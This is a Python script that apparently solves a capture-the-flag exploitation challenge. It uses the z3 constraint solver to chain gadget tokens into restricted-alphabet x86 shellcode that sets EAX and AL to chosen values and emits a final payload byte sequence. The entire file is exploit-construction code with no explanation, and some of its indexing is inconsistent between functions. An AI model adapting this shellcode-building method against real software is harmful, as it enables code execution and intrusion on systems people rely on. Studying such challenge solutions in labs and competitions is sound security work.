# coding: utf-8

from z3 import *
import struct

val_static = [927150662, 927150660, 927150658, 860042308, 944191811, 910570564, 893728833, 876752962, 876688449, 1110451014, 876951111, 826552389, 960770117, 893858882]

offsets = [
    0x2d2d4f4f,
    0x2d2d2d4f,
    0x2d2d2d2d,
    0x202d2d2d,
    0x57202d2d,
    0x6557202d,
    0x6c655720,
    0x636c6557,
    0x6f636c65,
    0x6d6f636c,
]

vals = val_static + [x for x in offsets]

readgadgets = [['B3', 'G' + str(i)] for i in range(10)]

def set_eax(eax_val, tolerance=0xfff, first_time=True):
    
    shellcode = []
    if first_time:
        for _ in range(0xe):
            shellcode += ['G8', 'G5']  # inc edi
        for _ in range(0x100-0x30):
            shellcode += ['E8', 'G0']  # inc ebp

    solver = Solver()
    l = []
    exp = None
    for i in range(len(vals)):
        temp = BitVec('b'+str(i), 32)
        l.append(temp)
        solver.add(Or(temp == 0, temp == 0xffffffff))
        if exp is not None:
            exp = exp ^ (vals[i] & temp)
        else:
            exp = (vals[i] & temp)
        
    solver.add(exp % 2 != 1)
    solver.add(exp > eax_val)
    solver.add(exp < eax_val + tolerance)
    solver.check()
    m = solver.model()

    res = 0
    for i in range(len(vals)):
        if not m[l[i]] == 0:
            print(hex(vals[i]))
            res ^= vals[i]
    print "Address found:", hex(res)
    #assert res == eax_val 

    for i in range(14):
        if not m[l[i]] == 0:
            # NB increases esp
            temp = struct.pack('<L', vals[i])
            shellcode += ['D5', temp[:2], temp[2:]]

    incs = 0
    for i in range(14, 24):
        if not m[l[i]] == 0:
            shellcode += readgadgets[i-18]

    return shellcode

def set_al2(al_val, prev_value=0):
    myvals = vals + [0xff]
    shellcode = []
    solver = Solver()
    l = []
    exp = None
    for i in range(len(myvals)):
        temp = BitVec('b'+str(i), 8)
        l.append(temp)
        solver.add(Or(temp == 0, temp == 0xff))
        if exp is not None:
            exp = exp ^ (myvals[i] & temp)
        else:
            exp = (myvals[i] & temp)
        
    solver.add(exp  == (al_val ^ prev_value))
    solver.check()
    m = solver.model()

    for i in range(len(myvals)):
        if not m[l[i]] == 0:
            print(hex(myvals[i]))
    #assert res == eax_val 

    for i in range(14):
        if not m[l[i]] == 0:
            # NB increases esp
            temp = struct.pack('<L', myvals[i])
            shellcode += ['D5', temp[:2], temp[2:]]

    incs = 0
    for i in range(14, 24):
        if not m[l[i]] == 0:
            shellcode += readgadgets[i-14]
    for i in range(24, 25):
        if not m[l[i]] == 0:
            shellcode += ['A2', 'E3']  # read ebp+0x30

    return shellcode

def set_al(al_val, prev_value=0, position=0):
    bytelist = [178, 201, 245, 108, 132, 152, 174, 200, 223, 234, 252, 10, 21, 205, 226, 243, 56, 67, 121, 207, 238, 2, 18, 59, 156, 234, 102, 134, 149, 162, 182, 152, 191, 222, 246, 5, 22, 63, 94, 131, 139, 156, 209, 231, 26, 163, 202, 73, 111, 146, 163, 217, 235, 103, 130, 192, 222, 243, 16, 59, 68, 89, 108, 131, 158, 197, 14, 41, 61, 194, 227, 0, 32, 64, 33, 0, 16, 255]

    big_vals = {
        0x46: 0x37433246,
        0x44: 0x37433244,
        0x42: 0x37433242,
        0x43: 0x38473943,
        0x41: 0x35453841,
        0x47: 0x34453647,
        0x45: 0x31443045,
    }

    dvals = {65: ['D5', 'A8', 'E5'],
         66: ['D5', 'B2', 'C7'],
         67: ['D5', 'C9', 'G8'],
         68: ['D5', 'D2', 'C7'],
         69: ['D5', 'E0', 'D1'],
         70: ['D5', 'F2', 'C7'],
         71: ['D5', 'G6', 'E4'],
    }
    vals = [x for x in dvals]

    ebpgadgets = [['G2', 'E' + str(i)] for i in (0, 4, 8)]
    incebp = ['E5', 'E4', 'C6', 'E5', 'E4', 'C6']

    steps = 0
    shellcode = []
    if position == 0:
        for _ in range(144 / 2):
            shellcode += incebp
        position = 144
    while position < (len(bytelist) * 4) + 144:
        available_bits = bytelist[(position-144)/4:(position-144)/4+3]
        #print(available_bits)
        tempvals = vals + available_bits
        #print(tempvals)
        solver = Solver()
        l = []
        exp = None
        for i in range(len(tempvals)):
            temp = BitVec('b'+str(i), 8)
            l.append(temp)
            solver.add(Or(temp == 0, temp == 0xff))
            if exp is not None:
                exp = exp ^ (tempvals[i] & temp)
            else:
                exp = (tempvals[i] & temp)
            
        solver.add(exp == (al_val ^ prev_value))
        solver.check()

        try:
            m = solver.model()
        
            for i in range(len(vals)):
                if not m[l[i]] == 0:
                    print('cons', hex(vals[i]))
                    # NB increases esp
                    shellcode += dvals[vals[i]]
            for i in range(len(tempvals) - len(vals)):
                if not m[l[len(vals) + i]] == 0:
                    print('mem', hex(available_bits[i]))
                    shellcode += ebpgadgets[i]

            print(steps)
            return shellcode, position

        except:
            #print("unsat")
            shellcode += incebp * 2
            position += 4
            steps += 1


    raise Exception("not solvable!")

shellcode = []
prev = 0x78
for x in ['0xa3', '0xd6', '0xa3', '0xd6', '0x2', '0x86', '0x83', '0x4d', '0x88', '0x3a', '0x7d', '0x6', '0x73', '0x77', '0xfa', '0x77', '0xe1', '0x8b', '0xb3']:
    new = set_al2(int(x, 16), prev)
    shellcode += new
    print(x, new)
    prev = int(x, 16)

print(shellcode)
